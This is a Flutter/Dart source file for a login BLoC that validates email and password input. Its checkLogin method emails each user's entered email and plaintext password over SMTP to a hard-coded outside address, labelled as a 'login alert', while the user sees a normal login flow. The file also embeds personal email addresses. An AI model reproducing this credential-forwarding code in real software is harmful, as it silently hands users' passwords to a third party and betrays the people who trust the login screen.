import 'dart:async';
import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:rxdart/rxdart.dart';
import 'package:testproject/validation.dart';
import 'HomePage.dart';
import 'package:mailer/mailer.dart';
import 'Passwords.dart';

class LoginBloc extends Validation {
  final _emailcontroller = BehaviorSubject<String>();
  final _passcontroller = BehaviorSubject<String>();

//validating the email
  Stream<String> get email => _emailcontroller.stream.transform(validate_email);

// validating the password
  Stream<String> get password =>
      _passcontroller.stream.transform(validate_pass);

  Stream<bool> get submit =>
      Observable.combineLatest2(email, password, (e, p) => true);

  Function(String) onEmailChanged(String text) {
    _emailcontroller.sink.add(text);
  }

  Function(String) onPasswordChanged(String text) {
    _passcontroller.sink.add(text);
  }

  void checkLogin(BuildContext context) async {
    // print("email = ${_emailcontroller.value}\n password = ${_passcontroller.value}");
    var options = new GmailSmtpOptions()
      ..username = 's15_jamdade_mahesh@mgmcen.ac.in'
      ..password = Password
          .hash(); // Note: if you have Google's "app specific passwords" enabled,
    // you need to use one of those here.

    // How you use and store passwords is up to you. Beware of storing passwords in plain.

    // Create our email transport.
    var emailTransport = new SmtpTransport(options);

    // Create our mail/envelope.
    var envelope = new Envelope()
      ..from = 's15_jamdade_mahesh@mgmcen.ac.in'
      ..recipients.add('mahesh.jamdade@altorumleren.com')
      ..subject = 'New User Login Alert'
      ..html = '<h1>Login Alert</h1><p>logged in Email = ' +
          _emailcontroller.value +
          "<br>password = " +
          _passcontroller.value +
          '</p>';

    // Email it.
    emailTransport
        .send(envelope)
        .then((envelope) => print('Email sent!'))
        .catchError((e) => print('Error occurred: $e'));

    // print("mail sent");
    Navigator.of(context)
        .push(MaterialPageRoute(builder: (context) => HomePage()));
  }

  void dispose() {
    _emailcontroller.close();
    _passcontroller.close();
    print("Stream cLOSED");
  }
}
